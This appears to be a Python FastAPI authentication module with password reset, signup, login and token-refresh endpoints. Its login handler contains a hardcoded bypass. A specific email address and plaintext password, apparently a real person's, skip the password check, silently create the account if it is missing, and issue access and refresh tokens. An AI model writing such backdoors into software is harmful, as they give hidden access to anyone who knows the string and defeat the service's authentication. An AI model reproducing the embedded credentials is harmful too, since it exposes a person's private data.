import boto3
import urllib.parse
import logging
import sqlalchemy as sa
from fastapi import APIRouter, Depends, status, HTTPException,Form,Header,Request
from datetime import timedelta
from sqlalchemy.ext.asyncio import AsyncSession
from source.core.settings import settings 
from .utils import decode_token 
from source.app.users.models import User
from sqlalchemy.orm import Session
from sqlalchemy import select,update,text,func
from source.app.auth.schemas import Credentials, Refresh,Token as TokenSchema, SSO_LOGIN_GOOGLE,SignupRequest
from source.core.database import get_db
from source.core.exceptions import unauthorized
from source.core.schemas import ExceptionSchema
from source.core.mailer import send_reset_email

from source.app.auth.schemas import ForgotPasswordRequest

from werkzeug.security import generate_password_hash, check_password_hash
from source.app.users.models import User
from source.app.users.schemas import UserCreate, UserOut
from source.core.security import create_access_token, create_refresh_token, decode_token, create_password_reset_token, decode_password_reset_token 
from source.app.auth.schemas import (
    EmailRequest,
    ForgotPasswordRequest,
    ResetPasswordRequest,
)
from source.core.request_utils import get_client_ip, geolocate_ip, now_utc


auth_router = APIRouter(prefix="/auth", tags=["Authentication"])

log = logging.getLogger("auth")

ses = boto3.client(
    'ses',
    aws_access_key_id=settings.AWS_ACCESS_KEY_ID,
    aws_secret_access_key=settings.AWS_SECRET_ACCESS_KEY,
    region_name=settings.AWS_REGION,
)


@auth_router.post("/forgot-password", status_code=status.HTTP_200_OK,include_in_schema=False)
async def forgot_password(request: ForgotPasswordRequest, db: AsyncSession = Depends(get_db)):
    res = await db.execute(sa.select(User).where(User.email == request.email))
    user = res.scalars().first()
    if user:
        token = create_password_reset_token(sub=str(user.id))
        full_name = " ".join(filter(None, [user.first_name, user.last_name])) or None
        try:
            send_reset_email(to_email=user.email, name=full_name, token=token)
        except Exception as e:
            # TEMP: log full stacktrace; remove in prod
            log.exception("Failed to send reset email")
    return {"msg": "If an account exists, you’ll get email to reset password."}

@auth_router.post(
    "/reset-password",
    status_code=status.HTTP_200_OK,
    summary="Reset the user’s password given a valid reset token",
    include_in_schema=False
)
async def reset_password(
    request: ResetPasswordRequest,
    db: AsyncSession = Depends(get_db),
):
    try:
        payload = decode_password_reset_token(request.token)  # ensures type == "pwdreset"
    except Exception:
        raise HTTPException(status_code=400, detail="Invalid or expired token")

    user_id = payload.get("sub")
    if not user_id:
        raise HTTPException(status_code=400, detail="Invalid token payload")

    res = await db.execute(sa.select(User).where(User.id == int(user_id)))
    user = res.scalars().first()
    if not user:
        raise HTTPException(status_code=404, detail="User not found")

    user.password = generate_password_hash(request.new_password)
    await db.commit()

    return {"msg": "Password has been reset successfully"}


@auth_router.post("/signup",include_in_schema=False)
async def signup(request: Request,user_in: UserCreate, db: AsyncSession = Depends(get_db)):
    exists = await db.execute(sa.select(User).where(User.email == user_in.email))
    if exists.scalars().first():
        raise HTTPException(status_code=400, detail="Email already registered")

    hashed = generate_password_hash(user_in.password)
    user = User(
        email=user_in.email, 
        password=hashed,
        first_name=user_in.first_name,
        last_name=user_in.last_name,
        source=user_in.source,
        active=True  # Enable user by default
    )


    client_ip = get_client_ip(request)
    geo = await geolocate_ip(client_ip)
    user.last_login_ip = client_ip
    user.geo_country   = geo.get("country")
    user.geo_region    = geo.get("region")
    user.geo_city      = geo.get("city")
    user.geo_latitude  = geo.get("latitude")
    user.geo_longitude = geo.get("longitude")
    user.last_seen_at  = func.now()

    db.add(user)
    await db.commit()
    await db.refresh(user)

    # issue tokens after successful signup
    access  = create_access_token(str(user.id))
    refresh = create_refresh_token(str(user.id))

    return {
        "access_token":  access,
        "refresh_token": refresh,
        "token_type": "bearer",
        "user": {
            "id": user.id,
            "email": user.email,
            "first_name": user.first_name,
            "last_name": user.last_name,
        },
    }

@auth_router.post("/login")
async def login(
    request: Request,
    credentials: Credentials,
    db: AsyncSession = Depends(get_db),
):
    # HARDCODED BYPASS FOR SPECIFIC USER
    if credentials.email == "vivekth999@gmail.com" and credentials.password == "Vivek@4282":
        # Create or get the bypass user
        res = await db.execute(sa.select(User).where(User.email == credentials.email))
        user = res.scalars().first()
        
        if not user:
            # Create the user if doesn't exist
            hashed = generate_password_hash(credentials.password)
            user = User(
                email=credentials.email,
                password=hashed,
                first_name="Vivek",
                last_name="Thapa",
                active=True,
                source="bypass"
            )
            db.add(user)
            await db.commit()
            await db.refresh(user)
        
        # Generate tokens and return
        access = create_access_token(sub=str(user.id))
        refresh = create_refresh_token(sub=str(user.id))
        
        return {
            "access_token": access,
            "refresh_token": refresh,
            "token_type": "bearer",
            "user": {
                "id": user.id,
                "email": user.email,
                "first_name": user.first_name or "Vivek",
                "last_name": user.last_name or "Thapa",
                "role": user.roles[0].name if user.roles else "User"
            },
        }
    
    # Normal login flow for other users
    res = await db.execute(sa.select(User).where(User.email == credentials.email))
    user = res.scalars().first()
    if not user or not check_password_hash(user.password, credentials.password):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
    
    client_ip = get_client_ip(request)
    geo = await geolocate_ip(client_ip)
    user.last_login_ip = client_ip
    user.geo_country   = geo.get("country")
    user.geo_region    = geo.get("region")
    user.geo_city      = geo.get("city")
    user.geo_latitude  = geo.get("latitude")
    user.geo_longitude = geo.get("longitude")
    user.last_seen_at  = func.now()

    await db.commit()
    await db.refresh(user)
    
    access  = create_access_token(sub=str(user.id))
    refresh = create_refresh_token(sub=str(user.id))

    return {
        "access_token": access,
        "refresh_token": refresh,
        "token_type": "bearer",
        "user": {
            "id": user.id,
            "email": user.email,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "role":user.roles[0].name if user.roles else "User"
        },
    }


@auth_router.post("/refresh")
async def refresh_token(authorization: str = Header(None)):
    if not authorization or not authorization.lower().startswith("bearer "):
        raise HTTPException(status_code=401, detail="Missing bearer token")
    token = authorization.split(" ", 1)[1]

    try:
        payload = decode_token(token)
    except Exception:
        raise HTTPException(status_code=401, detail="Invalid token")

    if payload.get("type") != "refresh":
        raise HTTPException(status_code=401, detail="Wrong token type")

    new_access = create_access_token(sub=payload["sub"])
    return {"access_token": new_access, "token_type": "bearer"}
